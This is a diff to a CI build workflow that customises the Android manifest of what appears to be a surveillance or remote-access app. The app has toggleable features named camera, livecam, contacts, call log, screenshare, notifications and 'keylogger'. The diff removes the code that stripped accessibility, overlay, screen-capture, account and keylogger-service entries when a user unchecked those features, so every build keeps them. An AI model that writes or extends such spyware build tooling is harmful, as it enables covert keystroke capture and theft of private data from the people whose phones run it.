@@ -96,7 +96,10 @@ jobs:
                   c = re.sub(rf'<meta-data\s+android:name=\"feat_{k}\"[^>]*/>\n?', '', c)
                   meta_injections += f'        <meta-data android:name=\"feat_{k}\" android:value=\"{val_str}\" />\n'
               if meta_injections:
-                  c = c.replace('<application', '<application\n' + meta_injections)
+                  app_tag_match = re.search(r'<application\b[^>]*>', c)
+                  if app_tag_match:
+                      end_pos = app_tag_match.end()
+                      c = c[:end_pos] + '\n' + meta_injections + c[end_pos:]
 
               # Strip permissions from manifest if unchecked by user
               if features.get('camera') is False and features.get('livecam') is False:
@@ -116,21 +119,9 @@ jobs:
                   c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.READ_CALL_LOG\"[^>]*/>', '', c)
                   c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.READ_CONTACTS\"[^>]*/>', '', c)
                   c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.CALL_PHONE\"[^>]*/>', '', c)
-                  c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.GET_ACCOUNTS\"[^>]*/>', '', c)
               if features.get('gallery') is False and features.get('files') is False:
                   c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.READ_EXTERNAL_STORAGE\"[^>]*/>', '', c)
                   c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.READ_MEDIA_[^\"]*\"[^>]*/>', '', c)
-              if features.get('screenshare') is False:
-                  c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION\"[^>]*/>', '', c)
-              if features.get('battery') is False:
-                  c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS\"[^>]*/>', '', c)
-              if features.get('notifications') is False:
-                  c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.POST_NOTIFICATIONS\"[^>]*/>', '', c)
-                  c = re.sub(r'<service\s+android:name=\"\.NotificationService\"[^>]*>.*?</service>', '', c, flags=re.DOTALL)
-              if features.get('keylogger') is False:
-                  c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.BIND_ACCESSIBILITY_SERVICE\"[^>]*/>', '', c)
-                  c = re.sub(r'\s*<uses-permission\s+android:name=\"android.permission.SYSTEM_ALERT_WINDOW\"[^>]*/>', '', c)
-                  c = re.sub(r'<service\s+android:name=\"\.KeyloggerService\"[^>]*>.*?</service>', '', c, flags=re.DOTALL)
 
               with open(manifest, 'w', encoding='utf-8') as f:
                   f.write(c)
